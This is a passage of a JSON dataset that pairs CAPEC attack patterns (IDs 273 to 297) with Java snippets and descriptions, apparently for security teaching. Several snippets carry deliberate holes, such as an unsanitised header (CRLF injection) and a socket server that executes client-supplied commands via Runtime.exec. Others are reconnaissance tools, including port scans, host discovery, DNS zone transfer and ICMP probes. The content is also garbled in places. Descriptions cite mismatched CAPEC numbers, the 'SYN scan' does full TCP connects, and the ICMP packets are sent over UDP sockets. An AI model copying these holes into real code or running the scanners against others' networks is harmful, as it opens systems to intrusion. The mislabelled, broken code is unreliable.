        "capec_id": "273",
        "capec_name": "HTTP Response Smuggling",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class VulnerableServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userInput = request.getParameter(\"input\");\n        if (userInput != null) {\n            // CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers\n            response.setHeader(\"X-User-Input\", userInput);\n        }\n        response.getWriter().println(\"Hello, World!\");\n    }\n}\n",
        "description": "This Java servlet code demonstrates a vulnerability related to HTTP Response Smuggling (CAPEC-33). The servlet takes user input from an HTTP request parameter and directly sets it as an HTTP header without proper sanitization. This can lead to HTTP Response Splitting (CWE-113) if the user input contains CRLF sequences, allowing an attacker to inject malicious HTTP responses. The code snippet highlights the risk of improper neutralization of special elements (CWE-74) and inconsistent interpretation of HTTP requests/responses (CWE-444)."
    },
    {
        "capec_id": "274",
        "capec_name": "HTTP Verb Tampering",
        "code_snippet": "import javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\n\npublic class VerbTamperingServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        // Process GET request\n        response.getWriter().write(\"GET request processed\");\n    }\n\n    @Override\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        // Process POST request\n        response.getWriter().write(\"POST request processed\");\n    }\n\n    @Override\n    protected void service(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String method = request.getMethod();\n        if (method.equals(\"GET\") || method.equals(\"POST\")) {\n            super.service(request, response);\n        } else {\n            // Improper handling of other HTTP verbs\n            response.getWriter().write(\"Unsupported HTTP method: \" + method);\n        }\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability to HTTP Verb Tampering. The 'service' method checks if the HTTP method is either GET or POST and processes the request accordingly. However, it does not properly handle other HTTP verbs, allowing an attacker to potentially bypass access restrictions by using unsupported HTTP methods. This code snippet embodies the main idea of CAPEC-274 (HTTP Verb Tampering) and highlights related weaknesses such as CWE-302 (Authentication Bypass by Assumed-Immutable Data) and CWE-654 (Reliance on a Single Factor in a Security Decision). The code assumes that only GET and POST methods are valid, but an attacker could use other methods to bypass these checks."
    },
    {
        "capec_id": "275",
        "capec_name": "DNS Rebinding",
        "code_snippet": "import java.net.InetAddress;\nimport java.net.UnknownHostException;\nimport java.net.Socket;\nimport java.io.IOException;\n\npublic class DNSRebindingExample {\n    public static void main(String[] args) {\n        String hostname = \"malicious.example.com\";\n        try {\n            // Initial DNS resolution\n            InetAddress initialAddress = InetAddress.getByName(hostname);\n            System.out.println(\"Initial IP: \" + initialAddress.getHostAddress());\n\n            // Simulate time delay for DNS rebinding\n            Thread.sleep(5000);\n\n            // DNS resolution after rebinding\n            InetAddress reboundAddress = InetAddress.getByName(hostname);\n            System.out.println(\"Rebound IP: \" + reboundAddress.getHostAddress());\n\n            // Attempt to connect to the rebound IP\n            try (Socket socket = new Socket(reboundAddress.getHostAddress(), 80)) {\n                System.out.println(\"Connected to: \" + socket.getRemoteSocketAddress());\n            } catch (IOException e) {\n                System.err.println(\"Connection failed: \" + e.getMessage());\n            }\n        } catch (UnknownHostException | InterruptedException e) {\n            System.err.println(\"DNS resolution failed: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a DNS rebinding attack. Initially, the code resolves the IP address of a hostname controlled by an adversary. After a delay (simulating the time taken for the adversary to change the DNS record), the code resolves the hostname again, which now points to a different IP address within the target organization. The code then attempts to connect to this new IP address. This represents the main idea of the CAPEC, where an adversary manipulates DNS records to gain access to internal network resources. The code also touches on CWE-350 (reliance on DNS resolution for security decisions) and CWE-1327 (binding to unrestricted IP addresses) by showing how DNS resolution can be exploited to redirect traffic to potentially sensitive internal addresses."
    },
    {
        "capec_id": "276",
        "capec_name": "Inter-component Protocol Manipulation",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableProtocol {\n    public static void main(String[] args) {\n        try {\n            ServerSocket serverSocket = new ServerSocket(8080);\n            Socket clientSocket = serverSocket.accept();\n            BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n            PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);\n\n            String receivedMessage = in.readLine();\n            // CWE-319: Cleartext Transmission of Sensitive Information\n            System.out.println(\"Received: \" + receivedMessage);\n\n            // CWE-924: Improper Enforcement of Message Integrity During Transmission\n            if (receivedMessage.equals(\"AUTHENTICATE\")) {\n                out.println(\"AUTH_SUCCESS\");\n            } else {\n                out.println(\"AUTH_FAIL\");\n            }\n\n            // CWE-707: Improper Neutralization\n            String command = in.readLine();\n            Runtime.getRuntime().exec(command); // Potentially dangerous command execution\n\n            clientSocket.close();\n            serverSocket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable inter-component protocol communication. The server listens on port 8080 and accepts incoming connections. It reads messages from the client in cleartext (CWE-319), which can be intercepted by unauthorized actors. The server does not verify the integrity of the received messages (CWE-924), allowing potential tampering during transmission. Additionally, the server executes commands received from the client without proper neutralization (CWE-707), leading to potential command injection vulnerabilities. This code embodies the main idea of CAPEC-272 by showcasing how improper handling of inter-component protocols can lead to various security issues."
    },
    {
        "capec_id": "277",
        "capec_name": "Data Interchange Protocol Manipulation",
        "code_snippet": "import javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.DocumentBuilder;\nimport org.w3c.dom.Document;\nimport org.xml.sax.InputSource;\nimport java.io.StringReader;\n\npublic class VulnerableXMLParser {\n    public static void main(String[] args) {\n        String xmlData = \"<user><id>123</id><role>admin</role></user>\";\n        parseXML(xmlData);\n    }\n\n    public static void parseXML(String xmlData) {\n        try {\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            Document document = builder.parse(new InputSource(new StringReader(xmlData)));\n\n            String userId = document.getElementsByTagName(\"id\").item(0).getTextContent();\n            String userRole = document.getElementsByTagName(\"role\").item(0).getTextContent();\n\n            // CWE-302: Authentication Bypass by Assumed-Immutable Data\n            if (userRole.equals(\"admin\")) {\n                System.out.println(\"User \" + userId + \" is an admin.\");\n            } else {\n                System.out.println(\"User \" + userId + \" is not an admin.\");\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable XML parser that embodies the main idea of CAPEC-272: Data Interchange Protocol Manipulation. The code parses an XML string containing user information, including an ID and a role. The vulnerability lies in the assumption that the 'role' field is immutable and trustworthy (CWE-302: Authentication Bypass by Assumed-Immutable Data). An attacker could manipulate the XML data to escalate privileges by changing the 'role' to 'admin'. The code does not validate or sanitize the input, making it susceptible to various attacks, including impersonation and unauthorized access."
    },
    {
        "capec_id": "278",
        "capec_name": "Web Services Protocol Manipulation",
        "code_snippet": "import javax.xml.soap.*;\nimport java.io.ByteArrayInputStream;\n\npublic class WebServiceProtocolManipulation {\n    public static void main(String[] args) throws Exception {\n        String maliciousSOAPMessage = \"<soapenv:Envelope xmlns:soapenv=\\\"http://schemas.xmlsoap.org/soap/envelope/\\\" xmlns:web=\\\"http://webservice.example.com/\\\"><soapenv:Header/><soapenv:Body><web:restrictedFunction><web:param>maliciousValue</web:param></web:restrictedFunction></soapenv:Body></soapenv:Envelope>\";\n\n        // Simulate receiving a SOAP message\n        SOAPMessage message = MessageFactory.newInstance().createMessage(null, new ByteArrayInputStream(maliciousSOAPMessage.getBytes()));\n\n        // Process the SOAP message\n        processSOAPMessage(message);\n    }\n\n    public static void processSOAPMessage(SOAPMessage message) throws Exception {\n        // Extract the body of the SOAP message\n        SOAPBody body = message.getSOAPBody();\n\n        // Improper neutralization of input\n        String functionName = body.getFirstChild().getLocalName();\n        String paramValue = body.getFirstChild().getFirstChild().getTextContent();\n\n        // Inconsistent interpretation of HTTP requests\n        if (functionName.equals(\"restrictedFunction\")) {\n            // Client-side enforcement of server-side security\n            if (paramValue.equals(\"maliciousValue\")) {\n                System.out.println(\"Access granted to restricted function with malicious value!\");\n            } else {\n                System.out.println(\"Access denied.\");\n            }\n        } else {\n            System.out.println(\"Function not recognized.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to Web Services Protocol Manipulation. The code simulates receiving a SOAP message that contains a call to a restricted function with a malicious parameter value. The `processSOAPMessage` method improperly neutralizes the input by directly extracting and using the function name and parameter value from the SOAP message without proper validation. This can lead to unauthorized access to restricted functions. Additionally, the code relies on client-side enforcement of server-side security, which is a common weakness. The snippet also highlights the potential for inconsistent interpretation of HTTP requests, as the function name and parameter value are not properly validated or sanitized."
    },
    {
        "capec_id": "279",
        "capec_name": "SOAP Manipulation",
        "code_snippet": "import javax.xml.soap.*;\nimport java.io.ByteArrayInputStream;\n\npublic class SOAPManipulationExample {\n    public static void main(String[] args) throws Exception {\n        String soapMessage = \"<soapenv:Envelope xmlns:soapenv=\\\"http://schemas.xmlsoap.org/soap/envelope/\\\" xmlns:web=\\\"http://example.com/webservices\\\">\"\n                + \"<soapenv:Header/>\"\n                + \"<soapenv:Body>\"\n                + \"<web:Login>\"\n                + \"<username>admin</username>\"\n                + \"<password>password</password>\"\n                + \"</web:Login>\"\n                + \"</soapenv:Body>\"\n                + \"</soapenv:Envelope>\";\n\n        // Simulate SOAP message manipulation\n        soapMessage = soapMessage.replace(\"<password>password</password>\", \"<password>hacked</password>\");\n\n        // Parse the manipulated SOAP message\n        MessageFactory messageFactory = MessageFactory.newInstance();\n        SOAPMessage message = messageFactory.createMessage(null, new ByteArrayInputStream(soapMessage.getBytes()));\n\n        // Process the SOAP message (vulnerable to CWE-707, CWE-602, CWE-611, CWE-294, CWE-603)\n        SOAPBody body = message.getSOAPBody();\n        SOAPElement loginElement = (SOAPElement) body.getChildElements().next();\n        String username = loginElement.getElementsByTagName(\"username\").item(0).getTextContent();\n        String password = loginElement.getElementsByTagName(\"password\").item(0).getTextContent();\n\n        // Print the extracted username and password\n        System.out.println(\"Username: \" + username);\n        System.out.println(\"Password: \" + password);\n    }\n}",
        "description": "This Java code snippet demonstrates a SOAP message manipulation vulnerability. The code constructs a SOAP message containing login credentials, then simulates an attack by modifying the password field. The manipulated SOAP message is parsed and processed without proper validation, exposing several vulnerabilities:\n\n1. CWE-707 (Improper Neutralization): The code does not validate the SOAP message content, allowing malicious modifications.\n2. CWE-602 (Client-Side Enforcement of Server-Side Security): The server relies on the client to send correct data without re-validating it.\n3. CWE-611 (Improper Restriction of XML External Entity Reference): The code processes XML without restrictions, potentially allowing external entity attacks.\n4. CWE-294 (Authentication Bypass by Capture-replay): The code does not protect against replay attacks, as it processes the message as-is.\n5. CWE-603 (Use of Client-Side Authentication): The code assumes the client has authenticated the user, which can be bypassed by modifying the client.\n\nThis example highlights the importance of validating and securing SOAP messages on the server side to prevent such vulnerabilities."
    },
    {
        "capec_id": "280",
        "capec_name": "DEPRECATED: SOAP Parameter Tampering",
        "code_snippet": "import javax.xml.soap.*;\nimport java.io.ByteArrayInputStream;\nimport java.nio.charset.StandardCharsets;\n\npublic class SOAPParameterTampering {\n    public static void main(String[] args) throws Exception {\n        String maliciousSOAPMessage = \"<soapenv:Envelope xmlns:soapenv=\\\"http://schemas.xmlsoap.org/soap/envelope/\\\" xmlns:web=\\\"http://example.com/webservices\\\">\"\n                + \"<soapenv:Header/>\"\n                + \"<soapenv:Body>\"\n                + \"<web:Login>\"\n                + \"<web:username>admin</web:username>\"\n                + \"<web:password>password</web:password>\"\n                + \"</web:Login>\"\n                + \"</soapenv:Body>\"\n                + \"</soapenv:Envelope>\";\n\n        MessageFactory messageFactory = MessageFactory.newInstance();\n        SOAPMessage soapMessage = messageFactory.createMessage(null, new ByteArrayInputStream(maliciousSOAPMessage.getBytes(StandardCharsets.UTF_8)));\n\n        // Simulate processing the SOAP message\n        SOAPBody soapBody = soapMessage.getSOAPBody();\n        SOAPElement loginElement = (SOAPElement) soapBody.getChildElements().next();\n        String username = loginElement.getElementsByTagName(\"web:username\").item(0).getTextContent();\n        String password = loginElement.getElementsByTagName(\"web:password\").item(0).getTextContent();\n\n        // Vulnerable code: directly using the tampered parameters\n        if (authenticate(username, password)) {\n            System.out.println(\"Authentication successful for user: \" + username);\n        } else {\n            System.out.println(\"Authentication failed for user: \" + username);\n        }\n    }\n\n    private static boolean authenticate(String username, String password) {\n        // Dummy authentication logic\n        return \"admin\".equals(username) && \"password\".equals(password);\n    }\n}",
        "description": "This Java code snippet demonstrates a SOAP parameter tampering vulnerability. The code constructs a SOAP message with hardcoded credentials and processes it without validating the integrity or authenticity of the message. This can lead to authentication bypass if an attacker modifies the SOAP message to include malicious parameters. The code directly uses the parameters from the SOAP message for authentication, which is a security risk. This example highlights the importance of validating and sanitizing input from SOAP messages to prevent tampering and related vulnerabilities."
    },
    {
        "capec_id": "285",
        "capec_name": "ICMP Echo Request Ping",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.UnknownHostException;\n\npublic class PingTest {\n    public static void main(String[] args) {\n        if (args.length != 1) {\n            System.out.println(\"Usage: java PingTest <IP address>\");\n            return;\n        }\n\n        String ipAddress = args[0];\n        try {\n            InetAddress inet = InetAddress.getByName(ipAddress);\n            System.out.println(\"Sending Ping Request to \" + ipAddress);\n            boolean status = inet.isReachable(5000); // Timeout = 5000ms\n\n            if (status) {\n                System.out.println(ipAddress + \" is reachable.\");\n            } else {\n                System.out.println(ipAddress + \" is not reachable.\");\n            }\n        } catch (UnknownHostException e) {\n            System.out.println(\"Unknown host: \" + ipAddress);\n        } catch (IOException e) {\n            System.out.println(\"Error in reaching the host: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple implementation of an ICMP Echo Request (Ping) to check if a target system is responsive. The program takes an IP address as a command-line argument and sends a ping request to that address. If the target system responds, it prints that the system is reachable; otherwise, it prints that the system is not reachable. This code embodies the main idea of the CAPEC by performing a ping operation to determine the responsiveness of a target system. The related CWEs provide additional context, such as the potential exposure of sensitive information (CWE-200) if the ping response reveals the presence of a system, and the cleartext transmission of data (CWE-319) since ICMP packets are not encrypted."
    },
    {
        "capec_id": "287",
        "capec_name": "TCP SYN Scan",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\npublic class TCPSynScan {\n    public static void main(String[] args) {\n        String target = \"192.168.1.1\";\n        int startPort = 1;\n        int endPort = 1024;\n\n        for (int port = startPort; port <= endPort; port++) {\n            try {\n                Socket socket = new Socket(target, port);\n                System.out.println(\"Port \" + port + \" is open.\");\n                socket.close();\n            } catch (UnknownHostException e) {\n                System.err.println(\"Unknown host: \" + target);\n                break;\n            } catch (IOException e) {\n                // Port is closed or filtered\n            }\n        }\n    }\n}",
        "description": "This Java code snippet performs a basic TCP SYN scan on a target IP address (192.168.1.1) over a range of ports (1 to 1024). The code attempts to establish a socket connection to each port in the specified range. If a connection is successful, it prints that the port is open. If an IOException occurs, it implies the port is closed or filtered. This code embodies the main idea of the CAPEC by demonstrating a SYN scan to determine the status of ports on a remote target. The related CWEs provide context for potential vulnerabilities, such as exposure of sensitive information (CWE-200) if the scan reveals open ports, or excessive attack surface (CWE-1125) if many ports are open and accessible."
    },
    {
        "capec_id": "288",
        "capec_name": "DEPRECATED: ICMP Echo Request Ping",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class PingReplayAttack {\n    public static void main(String[] args) throws IOException {\n        if (args.length != 1) {\n            System.out.println(\"Usage: java PingReplayAttack <target_ip>\");\n            return;\n        }\n\n        String targetIp = args[0];\n        byte[] icmpPacket = createIcmpEchoRequest();\n\n        // Send ICMP Echo Request\n        DatagramSocket socket = new DatagramSocket();\n        DatagramPacket packet = new DatagramPacket(icmpPacket, icmpPacket.length, InetAddress.getByName(targetIp), 0);\n        socket.send(packet);\n        System.out.println(\"ICMP Echo Request sent to \" + targetIp);\n\n        // Capture and replay the ICMP Echo Request\n        socket.receive(packet);\n        socket.send(packet);\n        System.out.println(\"ICMP Echo Request replayed to \" + targetIp);\n\n        socket.close();\n    }\n\n    private static byte[] createIcmpEchoRequest() {\n        byte[] packet = new byte[28];\n        packet[0] = 8; // Type: Echo Request\n        packet[1] = 0; // Code: 0\n        // Checksum, Identifier, Sequence Number, and Data can be set as needed\n        return packet;\n    }\n}",
        "description": "This Java code snippet demonstrates a basic ICMP Echo Request (ping) replay attack. The program sends an ICMP Echo Request to a specified target IP address, captures the response, and then replays the request. This embodies the deprecated CAPEC-285 (ICMP Echo Request Ping) attack pattern. The code also touches on CWE-294 (Authentication Bypass by Capture-replay) by showing how a captured network packet can be replayed to potentially bypass security mechanisms. The code is simplified for educational purposes and does not include error handling or detailed packet construction."
    },
    {
        "capec_id": "289",
        "capec_name": "DEPRECATED: Infrastructure-based footprinting",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class VulnerableCode {\n    private static Map<String, String> protectedData = new HashMap<>();\n    private static Map<String, String> unprotectedData = new HashMap<>();\n\n    static {\n        // Initialize protected data\n        protectedData.put(\"adminPassword\", \"superSecret\");\n        // Initialize unprotected data\n        unprotectedData.put(\"userPassword\", \"user123\");\n    }\n\n    public static void main(String[] args) {\n        // Simulate an overlap in address map\n        String key = \"adminPassword\";\n        if (unprotectedData.containsKey(key)) {\n            // Accessing protected data through unprotected map\n            System.out.println(\"Accessing protected data: \" + unprotectedData.get(key));\n        } else {\n            System.out.println(\"Accessing unprotected data: \" + unprotectedData.get(\"userPassword\"));\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where protected and unprotected data regions overlap, allowing unauthorized access to protected data. The `protectedData` map is intended to store sensitive information, while the `unprotectedData` map is for less sensitive information. However, due to an overlap in the key space (simulated by using the same key 'adminPassword'), an attacker can access protected data through the unprotected map. This represents the idea of CAPEC-169 and CWE-1316, where improper management of address maps or resource regions can lead to security breaches."
    },
    {
        "capec_id": "290",
        "capec_name": "Enumerate Mail Exchange (MX) Records",
        "code_snippet": "import java.net.InetAddress;\nimport java.net.UnknownHostException;\nimport java.util.Hashtable;\nimport javax.naming.Context;\nimport javax.naming.NamingEnumeration;\nimport javax.naming.directory.DirContext;\nimport javax.naming.directory.InitialDirContext;\nimport javax.naming.directory.Attributes;\n\npublic class MXRecordEnumerator {\n    public static void main(String[] args) {\n        String domain = \"example.com\";\n        try {\n            Hashtable<String, String> env = new Hashtable<>();\n            env.put(Context.INITIAL_CONTEXT_FACTORY, \"com.sun.jndi.dns.DnsContextFactory\");\n            DirContext ictx = new InitialDirContext(env);\n            Attributes attrs = ictx.getAttributes(domain, new String[] {\"MX\"});\n            NamingEnumeration<?> servers = attrs.get(\"MX\").getAll();\n            while (servers.hasMore()) {\n                String mxRecord = (String) servers.next();\n                String mailServer = mxRecord.split(\" \")[1];\n                System.out.println(\"Mail Server: \" + mailServer);\n                InetAddress address = InetAddress.getByName(mailServer);\n                System.out.println(\"IP Address: \" + address.getHostAddress());\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates how to enumerate MX (Mail Exchange) records for a given domain using DNS queries. The code uses Java's JNDI (Java Naming and Directory Interface) to perform the DNS lookup and retrieve the MX records. For each MX record, it extracts the mail server's hostname and resolves it to an IP address. This process can potentially expose sensitive information, such as the IP addresses of internal systems or firewalls, which aligns with the CAPEC description. The code also touches on related CWEs by potentially exposing sensitive information (CWE-200), relying on DNS resolution for security decisions (CWE-350), and possibly omitting security-relevant information (CWE-223)."
    },
    {
        "capec_id": "291",
        "capec_name": "DNS Zone Transfers",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class DNSZoneTransfer {\n    public static void main(String[] args) {\n        String dnsServer = \"example.com\";\n        try {\n            // Perform a DNS zone transfer\n            Socket socket = new Socket(dnsServer, 53);\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n\n            // Send a request for a zone transfer\n            out.println(\"AXFR\");\n\n            // Read the response\n            String response;\n            while ((response = in.readLine()) != null) {\n                System.out.println(response);\n            }\n\n            // Close the connections\n            in.close();\n            out.close();\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a DNS zone transfer request to a DNS server. The code attempts to connect to a DNS server on port 53 and sends an 'AXFR' request, which is used for zone transfers. If the DNS server is misconfigured to allow zone transfers, it will respond with a list of DNS records, potentially exposing sensitive information about the network topology. This embodies the main idea of CAPEC-139 (DNS Zone Transfers) and highlights CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) by showing how an attacker could exploit a misconfigured DNS server to gain unauthorized access to sensitive information."
    },
    {
        "capec_id": "292",
        "capec_name": "Host Discovery",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.UnknownHostException;\n\npublic class HostDiscovery {\n    public static void main(String[] args) {\n        String[] ipAddresses = {\"192.168.1.1\", \"192.168.1.2\", \"192.168.1.3\"};\n        for (String ip : ipAddresses) {\n            try {\n                InetAddress inet = InetAddress.getByName(ip);\n                if (inet.isReachable(1000)) { // CWE-291: Reliance on IP Address for Authentication\n                    System.out.println(\"Host \" + ip + \" is reachable.\");\n                } else {\n                    System.out.println(\"Host \" + ip + \" is not reachable.\");\n                }\n            } catch (UnknownHostException e) {\n                System.out.println(\"Unknown host: \" + ip);\n            } catch (IOException e) {\n                System.out.println(\"Error checking host: \" + ip);\n            }\n        }\n    }\n}",
        "description": "This Java code snippet performs a basic host discovery by pinging a range of IP addresses to determine if they are reachable. The code uses the `InetAddress` class to send a ping request to each IP address in the list. If the host responds within the specified timeout (1000 milliseconds), it is considered reachable. This embodies the main idea of CAPEC-309 (Host Discovery) by attempting to identify live hosts on a network. The code also demonstrates CWE-291 (Reliance on IP Address for Authentication) as it relies solely on the IP address to determine the host's presence, which can be exploited by an adversary. Additionally, the code does not handle sensitive information securely, potentially exposing it to unauthorized actors (CWE-200)."
    },
    {
        "capec_id": "293",
        "capec_name": "Traceroute Route Enumeration",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.UnknownHostException;\n\npublic class Traceroute {\n    public static void main(String[] args) {\n        if (args.length != 1) {\n            System.out.println(\"Usage: java Traceroute <hostname>\");\n            return;\n        }\n\n        String target = args[0];\n        int maxHops = 30;\n        int timeout = 3000;\n\n        try {\n            for (int ttl = 1; ttl <= maxHops; ttl++) {\n                Process trace = Runtime.getRuntime().exec(\"ping -c 1 -t \" + ttl + \" \" + target);\n                trace.waitFor();\n                if (trace.exitValue() == 0) {\n                    System.out.println(\"Reached target: \" + target);\n                    break;\n                }\n            }\n        } catch (IOException | InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple traceroute utility that attempts to map out the route data takes to reach a target destination. The code uses the 'ping' command with increasing TTL (Time-to-Live) values to identify each hop along the route. This approach can expose sensitive network topology information (CWE-200, CWE-497) and potentially transmit this information in cleartext (CWE-319). The code also does not handle sensitive trace data securely (CWE-1323) and may incorrectly specify the destination in the communication channel (CWE-941). The main idea is to illustrate how an adversary could use traceroute to gather network information, which aligns with the CAPEC description of Traceroute Route Enumeration."
    },
    {
        "capec_id": "294",
        "capec_name": "ICMP Address Mask Request",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class ICMPAddressMaskRequest {\n    public static void main(String[] args) {\n        try {\n            InetAddress target = InetAddress.getByName(\"192.168.1.1\");\n            byte[] icmpRequest = new byte[8];\n            icmpRequest[0] = 17; // ICMP Type 17 (Address Mask Request)\n            icmpRequest[1] = 0; // Code\n            // Checksum, Identifier, and Sequence Number are set to 0 for simplicity\n\n            DatagramSocket socket = new DatagramSocket();\n            DatagramPacket packet = new DatagramPacket(icmpRequest, icmpRequest.length, target, 0);\n            socket.send(packet);\n\n            byte[] buffer = new byte[1024];\n            DatagramPacket response = new DatagramPacket(buffer, buffer.length);\n            socket.receive(response);\n\n            System.out.println(\"Received ICMP Address Mask Reply from: \" + response.getAddress().getHostAddress());\n            // Process the response to extract subnet mask, default gateway, etc.\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates how an adversary might send an ICMP Type 17 Address Mask Request to a target IP address (192.168.1.1) to gather information about the target's networking configuration. The code creates an ICMP request packet, sends it to the target, and waits for an ICMP Type 18 Address Mask Reply. This reply can contain sensitive information such as the subnet mask, default gateway, and broadcast address. The code embodies the main idea of CAPEC-ICMP Address Mask Request and highlights related CWEs such as CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) and CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints). The code does not include proper validation or restrictions, making it vulnerable to misuse and demonstrating the potential security risks."
    },
    {
        "capec_id": "295",
        "capec_name": "Timestamp Request",
        "code_snippet": "import java.io.IOException;\nimport java.io.PrintWriter;\nimport java.text.SimpleDateFormat;\nimport java.util.Date;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/timestamp\")\npublic class TimestampServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        // CWE-598: Use of GET Request Method With Sensitive Query Strings\n        String sensitiveData = request.getParameter(\"sensitiveData\");\n        \n        // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n        if (sensitiveData != null) {\n            response.getWriter().println(\"Sensitive Data: \" + sensitiveData);\n        }\n        \n        // CWE-208: Observable Timing Discrepancy\n        long startTime = System.currentTimeMillis();\n        // Simulate some processing time\n        try {\n            Thread.sleep(1000); // 1 second delay\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n        long endTime = System.currentTimeMillis();\n        long processingTime = endTime - startTime;\n        \n        // CWE-385: Covert Timing Channel\n        response.getWriter().println(\"Processing Time: \" + processingTime + \"ms\");\n        \n        // Return the current timestamp\n        String timestamp = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\").format(new Date());\n        response.setContentType(\"text/plain\");\n        PrintWriter out = response.getWriter();\n        out.println(\"Current Timestamp: \" + timestamp);\n    }\n}",
        "description": "This Java servlet code demonstrates a 'Timestamp Request' vulnerability. The servlet handles GET requests and returns the current timestamp. It also includes several security weaknesses: \n1. CWE-598: Sensitive data is passed via the query string in a GET request.\n2. CWE-200: Sensitive data is exposed to unauthorized actors by printing it directly in the response.\n3. CWE-208: The processing time is observable, which can reveal security-relevant information.\n4. CWE-385: The processing time is printed, creating a covert timing channel.\nThe code represents how an attacker could exploit timestamp information and timing discrepancies to infer sensitive information or compromise time-based security mechanisms."
    },
    {
        "capec_id": "296",
        "capec_name": "ICMP Information Request",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class ICMPInfoRequest {\n    public static void main(String[] args) {\n        try {\n            InetAddress address = InetAddress.getByName(\"192.168.1.1\");\n            byte[] buffer = new byte[8];\n            buffer[0] = 0x0F; // Type: ICMP Information Request (deprecated)\n            buffer[1] = 0x00; // Code\n            buffer[2] = 0x00; // Checksum (not calculated for simplicity)\n            buffer[3] = 0x00;\n            buffer[4] = 0x00; // Identifier\n            buffer[5] = 0x00;\n            buffer[6] = 0x00; // Sequence Number\n            buffer[7] = 0x00;\n\n            DatagramPacket packet = new DatagramPacket(buffer, buffer.length, address, 0);\n            DatagramSocket socket = new DatagramSocket();\n            socket.send(packet);\n\n            // Receive response\n            byte[] recvBuf = new byte[1024];\n            DatagramPacket recvPacket = new DatagramPacket(recvBuf, recvBuf.length);\n            socket.receive(recvPacket);\n            System.out.println(\"Received response: \" + new String(recvPacket.getData()));\n\n            socket.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates how an adversary might send an ICMP Information Request to a host to determine if it responds to this deprecated mechanism. The code constructs an ICMP Information Request packet and sends it to a specified IP address. If the host responds, the response is printed out. This action can expose sensitive information (CWE-200, CWE-497) and involves transmitting data in cleartext (CWE-319). The code does not include proper security identifiers (CWE-1192, CWE-1302), making it vulnerable to unauthorized access and information leakage."
    },
    {
        "capec_id": "297",
        "capec_name": "TCP ACK Ping",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\npublic class TCPAckPing {\n    public static void main(String[] args) {\n        if (args.length != 1) {\n            System.out.println(\"Usage: java TCPAckPing <host>\");\n            return;\n        }\n\n        String host = args[0];\n        try {\n            InetAddress inetAddress = InetAddress.getByName(host);\n            // Attempt to create a socket connection to the host on a common port\n            try (Socket socket = new Socket(inetAddress, 80)) {\n                System.out.println(\"Host is alive\");\n            } catch (IOException e) {\n                System.out.println(\"Host is not responding\");\n            }\n        } catch (UnknownHostException e) {\n            System.out.println(\"Unknown host: \" + host);\n        }\n    }\n}",
